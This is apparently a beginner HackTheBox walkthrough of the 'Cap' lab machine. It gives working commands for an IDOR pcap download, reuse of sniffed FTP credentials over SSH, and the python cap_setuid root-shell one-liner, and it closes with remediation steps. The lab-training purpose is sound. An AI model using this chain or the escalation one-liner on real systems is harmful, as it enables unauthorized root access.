# Cap - HackTheBox Walkthrough

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen) ![OS](https://img.shields.io/badge/OS-Linux-blue) ![Rating](https://img.shields.io/badge/Rating-4.6%2F5-yellow)

---

## 📋 Machine Info

- **Name:** Cap
- **IP:** 10.129.1.216
- **OS:** Linux (Ubuntu 20.04.2 LTS)
- **Difficulty:** Easy
- **Release Date:** June 5, 2021
- **Retired Date:** October 2, 2021

---

## 🔍 Reconnaissance

### What is Reconnaissance?

Reconnaissance (or "recon") is the first phase of penetration testing where we gather information about our target. Think of it like scouting before a battle - we need to know what we're dealing with!

### Initial Nmap Scan

**What is Nmap?**  
Nmap (Network Mapper) is a powerful network scanning tool that helps us discover:
- What ports are open on the target
- What services are running on those ports
- What versions of those services are installed

**Command Used:**
```bash
nu -d -p- -A 10.129.1.216
```

**Command Breakdown:**
- `nu` - Nmap Unleashed (a wrapper/alias for nmap)
- `-d` - Enable debugging (shows detailed progress)
- `-p-` - Scan ALL 65,535 ports (not just common ones)
  - `-p-` is shorthand for `-p1-65535`
  - By default, Nmap only scans ~1,000 common ports
- `-A` - Aggressive scan (enables OS detection, version detection, script scanning, and traceroute)
- `10.129.1.216` - Target IP address

**Why these flags?**
- `-d` helps us see what Nmap is doing in real-time
- `-p-` ensures we don't miss any services on uncommon ports
- `-A` gives us maximum information about each service

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    gunicorn
```

**Understanding the Results:**

| Port | Service | Version | What it means |
|------|---------|---------|---------------|
| **21/tcp** | FTP | vsftpd 3.0.3 | File Transfer Protocol - used for uploading/downloading files |
| **22/tcp** | SSH | OpenSSH 8.2p1 | Secure Shell - encrypted remote access to the server |
| **80/tcp** | HTTP | Gunicorn | Web server - hosts a website we can visit in our browser |

**Key Takeaway:** We found 3 open services. Each one is a potential entry point into the system!

---

## 🌐 Web Enumeration

### What is Web Enumeration?

Web enumeration is the process of exploring a web application to understand its structure, functionality, and potential vulnerabilities. We're basically mapping out the website.

### Exploring Port 80

**Why check port 80?**  
Port 80 is the standard HTTP port. If it's open, there's a website we can investigate!

**How to access it:**
```bash
# Option 1: Use a web browser
firefox http://10.129.1.216

# Option 2: Use curl from command line
curl http://10.129.1.216
```

**What I Found:**  
A "Security Dashboard" application - looks like a network monitoring tool.

**Dashboard Features:**
- Security Events: 1,560
- Failed Login Attempts: 357
- Port Scans (Unique IPs): 27
- **Important:** Logged in as user "Nathan" (we didn't even provide credentials!)

### Discovered Endpoints

**What is an endpoint?**  
An endpoint is a specific URL path on a website (like different pages or functions).

```
http://10.129.1.216/           - Main Dashboard
http://10.129.1.216/data/1     - PCAP Analysis page
```

**Why is /data/1 interesting?**  
The number "1" in the URL suggests there might be other numbers we can try (like /data/0, /data/2, etc.)

---

## 💣 IDOR Vulnerability Discovery

### What is IDOR?

**IDOR = Insecure Direct Object Reference**

This is when a website lets you access data by simply changing a number or ID in the URL, without checking if you're authorized to see it.

**Real-world example:**  
Imagine a bank website where:
- Your account: `bank.com/account/12345`
- Someone else's account: `bank.com/account/12346`

If you can just change the number and see someone else's account, that's IDOR!

### Testing the /data Endpoint

**Initial observation on /data/1:**
```
Number of Packets: 0
Number of IP Packets: 0
Number of TCP Packets: 0
Number of UDP Packets: 0
```

Empty data! Let's test if we can access other IDs.

**Testing for IDOR:**

```bash
curl http://10.129.1.216/data/0 -I
```

**Command Breakdown:**
- `curl` - Command-line tool for making HTTP requests
- `http://10.129.1.216/data/0` - URL we're testing (changed 1 to 0)
- `-I` - Show only HTTP headers (quick check)

**Result:** 
```
HTTP/1.0 200 OK
Content-Type: application/vnd.tcpdump.pcap
Content-Length: 9935
```

**Jackpot!** Different content size (9935 bytes vs 0)! This means `/data/0` has actual data!

### Downloading the PCAP File

**What is a PCAP file?**  
PCAP (Packet Capture) files contain recorded network traffic. Think of it like a recording of all network communications.

**Command to download:**
```bash
wget http://10.129.1.216/data/0 -O 0.pcap
```

**Command Breakdown:**
- `wget` - Command-line tool for downloading files
- `http://10.129.1.216/data/0` - URL of the file
- `-O 0.pcap` - Save the file as "0.pcap" (Output filename)
  - Without `-O`, it would save as just "0"
  - `.pcap` extension helps us identify it's a packet capture

**Why this is a vulnerability:**  
We just downloaded someone else's network traffic without authentication! This is a serious security flaw.

---

## 🔐 Credential Discovery

### Analyzing PCAP with Wireshark

**What is Wireshark?**  
Wireshark is like a microscope for network traffic. It lets us see every packet (data chunk) that was sent over the network.

**Command to open:**
```bash
wireshark 0.pcap
```

**How to find credentials in Wireshark:**

1. **Open the PCAP file** in Wireshark
2. **Apply a filter** to find FTP traffic:
   - In the filter bar, type: `ftp`
   - This shows only FTP-related packets
3. **Look for authentication packets:**
   - `USER` command - shows the username
   - `PASS` command - shows the password

**What I Found:**

```
Packet #40: Request: USER nathan
Packet #41: Response: 331 Please specify the password.
Packet #42: Request: PASS Buck3tH4TF0RM3!
Packet #43: Response: 230 Login successful.
```

**Why can we see the password?**  
FTP (File Transfer Protocol) sends data in **cleartext** (unencrypted). It's like sending a postcard instead of a sealed letter - anyone can read it!

**Credentials Found:**
```
Username: nathan
Password: Buck3tH4TF0RM3!
```

**Learning Point:** This is why we should NEVER use FTP for sensitive data. Always use encrypted alternatives like SFTP or FTPS.

---

## 🚪 Initial Access - SSH

### What is SSH?

**SSH (Secure Shell)** is an encrypted protocol for remote access to a computer. Unlike FTP, SSH encrypts all communication, so passwords can't be intercepted.

### Testing Credential Reuse

**What is credential reuse?**  
Many users make the mistake of using the same username/password across multiple services. Let's test if Nathan used the same FTP password for SSH!

**Command:**
```bash
ssh nathan@10.129.1.216
```

**Command Breakdown:**
- `ssh` - Secure Shell client
- `nathan` - Username we're trying to log in as
- `@` - Separator between username and host
- `10.129.1.216` - Target IP address

**When prompted, enter password:** `Buck3tH4TF0RM3!`

**Success! We're in! 🎉**

```
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

System information as of Thu Feb 12 18:58:02 UTC 2026

  System load:           0.0
  Usage of /:            36.8% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             222
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.216

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$
```

**Understanding the prompt:**
- `nathan` - Current username
- `cap` - Machine hostname
- `~` - Current directory (~ means home directory)
- `$` - Regular user (# would mean root)

### Getting the User Flag

**What is a flag?**  
In HackTheBox, flags are special strings that prove you successfully compromised the system. Think of them like "proof of completion."

**Commands:**
```bash
nathan@cap:~$ ls
linpeas.sh  snap  user.txt

nathan@cap:~$ cat user.txt
563063560656daf18f4af2402388fb90
```

**Command Breakdown:**
- `ls` - List files in current directory
- `cat user.txt` - Display contents of user.txt file
  - `cat` = concatenate (shows file contents)

**User flag captured!** ✅

---

## ⬆️ Privilege Escalation

### What is Privilege Escalation?

Right now we're user "nathan" with limited permissions. **Privilege escalation** is the process of going from a regular user to root (administrator) to gain full control of the system.

Think of it like:
- Nathan = Guest in a house (limited access)
- Root = Homeowner (access to everything)

### Enumeration with LinPEAS

**What is LinPEAS?**  
LinPEAS (Linux Privilege Escalation Awesome Script) is an automated tool that scans for privilege escalation opportunities. It's like having a checklist of 1,000+ things to check!

**Step 1: Upload LinPEAS to Target**

**On your attacker machine:**
```bash
python3 -m http.server 8000
```

**What this does:**
- `python3 -m http.server` - Starts a simple web server
- `8000` - Port number to serve on
- This lets the target download files from your machine

**On the target machine:**
```bash
wget http://10.10.14.71:8000/linpeas.sh
```

**Command Breakdown:**
- `wget` - Download tool
- `http://10.10.14.71:8000/linpeas.sh` - URL where LinPEAS is hosted
  - `10.10.14.71` is YOUR attacker machine IP (from HackTheBox VPN)

**Step 2: Make LinPEAS executable:**
```bash
chmod +x linpeas.sh
```

**Command Breakdown:**
- `chmod` - Change file permissions
- `+x` - Add execute permission
- `linpeas.sh` - File to modify

**Why?** Downloaded files aren't executable by default. We need to give it permission to run.

**Step 3: Run LinPEAS:**
```bash
./linpeas.sh
```

**Command Breakdown:**
- `./` - Current directory
- `linpeas.sh` - Script to run

**Why the `./`?** For security reasons, Linux doesn't run programs from the current directory unless you explicitly specify `./`

### Critical Finding - Python Capabilities

**LinPEAS Output:**
```bash
╔══════════╣ Capabilities
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

**What are Linux Capabilities?**

Linux capabilities are a way to give specific privileges to programs without making them fully SUID (Set User ID).

**Normal permission model:**
- Regular programs run as the user who started them
- SUID programs run as the file owner (often root)

**Capabilities:**
- Fine-grained permissions
- Example: `cap_net_raw` allows creating raw network packets (for ping)

**The Critical Finding:**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**Breaking this down:**
- `/usr/bin/python3.8` - The Python 3.8 program
- `cap_setuid` - **DANGEROUS!** Allows changing user ID to anyone (including root!)
- `cap_net_bind_service` - Allows binding to privileged ports (not important here)
- `+eip` - Effective, Inheritable, Permitted (capability is active)

**Why is `cap_setuid` dangerous?**  
It means Python can change its user ID to 0 (root), giving us full system access!

### Exploiting Linux Capabilities

**Where to find exploits?**  
[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be exploited for privilege escalation.

**Searching GTFOBins:**
1. Go to https://gtfobins.github.io/
2. Search for "python"
3. Click on "Capabilities"
4. Find the `cap_setuid` section

**The Exploit:**
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Command Breakdown:**

- `/usr/bin/python3.8` - Full path to Python (ensures we use the one with capabilities)
- `-c` - Execute Python code from command line
- `'import os; os.setuid(0); os.system("/bin/bash")'` - The malicious code:
  
  **Breaking down the Python code:**
  1. `import os` - Import the operating system module
  2. `os.setuid(0)` - Change user ID to 0 (root)
     - `0` is always the root user ID in Linux
     - This works because Python has `cap_setuid`
  3. `os.system("/bin/bash")` - Start a new bash shell
     - Since we're now root, this bash shell has root privileges!

**Executing the exploit:**
```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~#
```

**Notice the prompt change:**
- `nathan@cap:~$` (regular user)
- `root@cap:~#` (root user - notice the `#`)

**Root shell obtained!** ✅

**Verify we're root:**
```bash
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

root@cap:~# whoami
root
```

**Command Breakdown:**
- `id` - Shows user ID, group ID, and group memberships
  - `uid=0(root)` - We are root!
- `whoami` - Shows current username

### Getting the Root Flag

```bash
root@cap:~# cd /root
```
- `cd` - Change directory
- `/root` - Root user's home directory

```bash
root@cap:/root# ls
root.txt  snap
```
- `ls` - List files

```bash
root@cap:/root# cat root.txt
9b56248d5833c82982eea79e7c20cb00
```
- `cat root.txt` - Display root flag

**Root flag captured!** ✅

---

## 🔗 Attack Chain Summary

Here's the complete path we took from nothing to root:

```
1. Nmap Scan
   └─> Discovered ports 21 (FTP), 22 (SSH), 80 (HTTP)

2. Web Enumeration
   └─> Found Security Dashboard with /data endpoint

3. IDOR Testing
   └─> Tested /data/0 instead of /data/1
   └─> Found accessible PCAP file

4. PCAP Download
   └─> wget http://10.129.1.216/data/0

5. Wireshark Analysis
   └─> Found FTP credentials in cleartext
   └─> nathan:Buck3tH4TF0RM3!

6. Credential Reuse
   └─> Tested FTP password on SSH
   └─> Successfully logged in as nathan

7. User Flag
   └─> cat user.txt
   └─> 563063560656daf18f4af2402388fb90

8. Automated Enumeration
   └─> Uploaded and ran LinPEAS

9. Capability Discovery
   └─> Found Python3.8 with cap_setuid

10. Privilege Escalation
    └─> Used GTFOBins technique
    └─> Got root shell

11. Root Flag
    └─> cat /root/root.txt
    └─> 9b56248d5833c82982eea79e7c20cb00
```

---

## 🐛 Vulnerabilities Identified

| Vulnerability | CWE | Severity | Impact | Fix |
|---------------|-----|----------|--------|-----|
| **IDOR on /data endpoint** | [CWE-639](https://cwe.mitre.org/data/definitions/639.html) | HIGH | Anyone can access other users' PCAP files | Add authorization checks |
| **Cleartext FTP** | [CWE-319](https://cwe.mitre.org/data/definitions/319.html) | HIGH | Passwords visible in network traffic | Use SFTP instead |
| **Credential reuse** | [CWE-257](https://cwe.mitre.org/data/definitions/257.html) | MEDIUM | Same password works on multiple services | Enforce unique passwords |
| **Excessive capabilities** | [CWE-250](https://cwe.mitre.org/data/definitions/250.html) | CRITICAL | Python can escalate to root | Remove cap_setuid from Python |

---

## 🛠️ Tools Used - Detailed Explanation

### 1. Nmap (Network Mapper)
**Purpose:** Network scanning and service enumeration  
**When to use:** Beginning of every penetration test  
**Basic syntax:** `nmap [options] [target]`

**Common options:**
- `-p-` - Scan all ports
- `-sV` - Version detection
- `-sC` - Run default scripts
- `-A` - Aggressive scan (OS, version, scripts)
- `-oA` - Output all formats

**Our command:**
```bash
nu -d -p- -A 10.129.1.216
```

### 2. cURL
**Purpose:** Make HTTP requests from command line  
**When to use:** Testing web endpoints, APIs  
**Basic syntax:** `curl [options] [URL]`

**Common options:**
- `-I` - Show headers only
- `-X` - Specify HTTP method (GET, POST, etc.)
- `-d` - Send data in request body
- `-H` - Add custom header

**Our command:**
```bash
curl http://10.129.1.216/data/0 -I
```

### 3. Wget
**Purpose:** Download files from the internet  
**When to use:** Downloading files, tools, scripts  
**Basic syntax:** `wget [options] [URL]`

**Common options:**
- `-O` - Save as specific filename
- `-r` - Recursive download
- `-q` - Quiet mode
- `-c` - Continue partial downloads

**Our command:**
```bash
wget http://10.129.1.216/data/0 -O 0.pcap
```

### 4. Wireshark
**Purpose:** Network protocol analyzer  
**When to use:** Analyzing packet captures  
**Basic syntax:** `wireshark [file.pcap]`

**Key features:**
- Filter traffic (e.g., `ftp`, `http`, `tcp.port==80`)
- Follow TCP streams
- Export objects from captures
- Decode encrypted traffic (with keys)

**Our command:**
```bash
wireshark 0.pcap
```

### 5. SSH (Secure Shell)
**Purpose:** Encrypted remote access  
**When to use:** Connecting to remote systems  
**Basic syntax:** `ssh [user]@[host]`

**Common options:**
- `-p` - Specify port (default: 22)
- `-i` - Use specific private key
- `-L` - Port forwarding

**Our command:**
```bash
ssh nathan@10.129.1.216
```

### 6. Python HTTP Server
**Purpose:** Quick file sharing  
**When to use:** Transferring tools to target  
**Basic syntax:** `python3 -m http.server [port]`

**Our command:**
```bash
python3 -m http.server 8000
```

### 7. LinPEAS
**Purpose:** Automated Linux privilege escalation enumeration  
**When to use:** After getting initial access  
**Basic syntax:** `./linpeas.sh`

**What it checks:**
- SUID binaries
- Capabilities
- Writable files
- Cron jobs
- Kernel exploits
- And much more!

**Our commands:**
```bash
chmod +x linpeas.sh
./linpeas.sh
```

---

## 📚 Key Commands Reference

### Reconnaissance Phase
```bash
# Full port scan
nmap -p- -A 10.129.1.216

# Quick scan (common ports)
nmap 10.129.1.216

# Service version detection
nmap -sV 10.129.1.216
```

### Web Testing
```bash
# Check HTTP headers
curl http://10.129.1.216/data/0 -I

# Full HTTP response
curl http://10.129.1.216/data/0

# Follow redirects
curl -L http://10.129.1.216
```

### File Operations
```bash
# Download file
wget http://10.129.1.216/data/0 -O capture.pcap

# List files
ls -la

# View file contents
cat filename.txt

# Edit file
nano filename.txt
```

### Network Analysis
```bash
# Open PCAP in Wireshark
wireshark capture.pcap

# Command-line packet analysis
tcpdump -r capture.pcap

# Filter specific protocol
tcpdump -r capture.pcap 'ftp'
```

### Access & Enumeration
```bash
# SSH login
ssh username@ip_address

# Start HTTP server
python3 -m http.server 8000

# Download from your server
wget http://your_ip:8000/tool.sh

# Make script executable
chmod +x script.sh

# Run script
./script.sh
```

### Privilege Escalation
```bash
# Check current user
whoami
id

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check capabilities
getcap -r / 2>/dev/null

# Python setuid exploit
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 💡 Lessons Learned

### 1. IDOR Vulnerabilities

**What we learned:**
- Always test sequential IDs in URLs (0, 1, 2, 3...)
- IDOR = Insecure Direct Object Reference
- Can expose sensitive data without authentication

**How to test:**
1. Find URLs with numbers or IDs
2. Try changing the ID
3. See if you can access other users' data

**Example:**
```
Original:  /data/1
Test:      /data/0, /data/2, /data/3
```

**Prevention:**
- Check user authorization before showing data
- Use random/unpredictable IDs instead of sequential
- Implement proper access controls

### 2. Packet Capture Analysis

**What we learned:**
- PCAP files can contain passwords
- FTP sends everything in cleartext
- Always check network traffic for credentials

**Important protocols that send cleartext:**
- ❌ FTP (File Transfer Protocol)
- ❌ HTTP (Hypertext Transfer Protocol)
- ❌ Telnet
- ❌ SMTP (Simple Mail Transfer Protocol)

**Secure alternatives:**
- ✅ SFTP (SSH File Transfer Protocol)
- ✅ HTTPS (HTTP Secure)
- ✅ SSH (Secure Shell)
- ✅ SMTPS (SMTP Secure)

### 3. Credential Reuse

**What we learned:**
- People often use same password across services
- Always test found credentials everywhere
- FTP password = SSH password (in this case)

**Where to test credentials:**
- SSH (port 22)
- FTP (port 21)
- Web logins
- Database access
- Admin panels

### 4. Linux Capabilities

**What we learned:**
- Capabilities can be as dangerous as SUID
- Check with `getcap -r / 2>/dev/null`
- GTFOBins has exploitation techniques

**Dangerous capabilities:**
- `cap_setuid` - Can change to any user (including root!)
- `cap_dac_override` - Bypass file permission checks
- `cap_fowner` - Bypass permission checks on file operations

**How to check:**
```bash
# Check all capabilities on system
getcap -r / 2>/dev/null

# Check specific file
getcap /usr/bin/python3.8
```

---

## 🛡️ Remediation (How to Fix These Issues)

### Fix #1: IDOR Vulnerability

**Problem:** Anyone can access `/data/0`, `/data/1`, etc.

**Solution:** Add authorization checks

```python
@app.route('/data/<int:capture_id>')
@login_required  # User must be logged in
def get_capture(capture_id):
    # Get the capture from database
    capture = Capture.query.get_or_404(capture_id)
    
    # CHECK: Does this user own this capture?
    if capture.user_id != current_user.id:
        abort(403)  # Forbidden - not your data!
        
    return send_file(capture.filepath)
```

### Fix #2: Disable Cleartext FTP

**Problem:** FTP sends passwords in cleartext

**Solution:** Use SFTP instead

```bash
# Stop and disable FTP service
sudo systemctl stop vsftpd
sudo systemctl disable vsftpd

# SFTP is already available through SSH!
# Users can connect with:
sftp nathan@10.129.1.216
```

### Fix #3: Remove Dangerous Capability

**Problem:** Python has `cap_setuid` capability

**Solution:** Remove it

```bash
# Remove capability from Python
sudo setcap -r /usr/bin/python3.8

# Verify it's gone
getcap /usr/bin/python3.8
# Should return nothing
```

### Fix #4: Enforce Strong Password Policy

**Problem:** Same password used for FTP and SSH

**Solution:** Multiple improvements

```bash
# 1. Disable password authentication for SSH
# Edit /etc/ssh/sshd_config:
PasswordAuthentication no
PubkeyAuthentication yes

# 2. Require strong passwords
# Edit /etc/security/pwquality.conf:
minlen = 14
dcredit = -1  # Require digit
ucredit = -1  # Require uppercase
lcredit = -1  # Require lowercase
ocredit = -1  # Require special char

# 3. Restart SSH service
sudo systemctl restart sshd
```

---

## 📖 Additional Resources for Learning

### Beginner-Friendly Guides
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks Book](https://book.hacktricks.xyz/) - Comprehensive pentesting guide
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free interactive labs

### Tool Documentation
- [Nmap Official Guide](https://nmap.org/book/man.html)
- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
- [GTFOBins](https://gtfobins.github.io/) - Unix binary exploitation

### Vulnerability Databases
- [CWE (Common Weakness Enumeration)](https://cwe.mitre.org/)
- [CVE (Common Vulnerabilities and Exposures)](https://cve.mitre.org/)
- [Exploit-DB](https://www.exploit-db.com/)

### Practice Platforms
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)

---

## ⏱️ Timeline

| Time | Phase | Activity |
|------|-------|----------|
| 0:00 | Recon | Started Nmap scan, discovered 3 open ports |
| 0:05 | Enum | Explored web application, found dashboard |
| 0:10 | Vuln | Discovered IDOR on /data endpoint |
| 0:15 | Exploit | Downloaded PCAP file using IDOR |
| 0:20 | Analysis | Analyzed PCAP with Wireshark, found creds |
| 0:25 | Access | SSH login successful, got user flag |
| 0:30 | Enum | Uploaded and ran LinPEAS |
| 0:40 | PrivEsc | Found Python capability, checked GTFOBins |
| 0:45 | Root | Exploited cap_setuid, got root flag |

**Total Time: ~45 minutes**

---

## 🎯 Junior Pentester Tips

### Before You Start
1. **Take notes** - Document EVERYTHING
2. **Screenshot important findings**
3. **Save all commands you run**
4. **Keep a methodology checklist**

### During the Test
1. **Enumerate thoroughly** - Don't rush to exploits
2. **Google is your friend** - Research unknown services
3. **Try the obvious** - Default creds, common exploits
4. **Test everything** - Every open port, every parameter

### When You're Stuck
1. **Go back to enumeration** - You probably missed something
2. **Read tool output carefully** - The answer is often there
3. **Check forums** - HackTheBox has great community support
4. **Take a break** - Fresh eyes see new things

### Good Habits
- ✅ Always verify what commands do before running them
- ✅ Understand the "why" behind each step
- ✅ Keep a personal knowledge base of techniques
- ✅ Practice in safe, legal environments only

---

**Machine Pwned!** 💀

---

[← Back to Track](../README.md) | [← Back to Main](../../README.md)
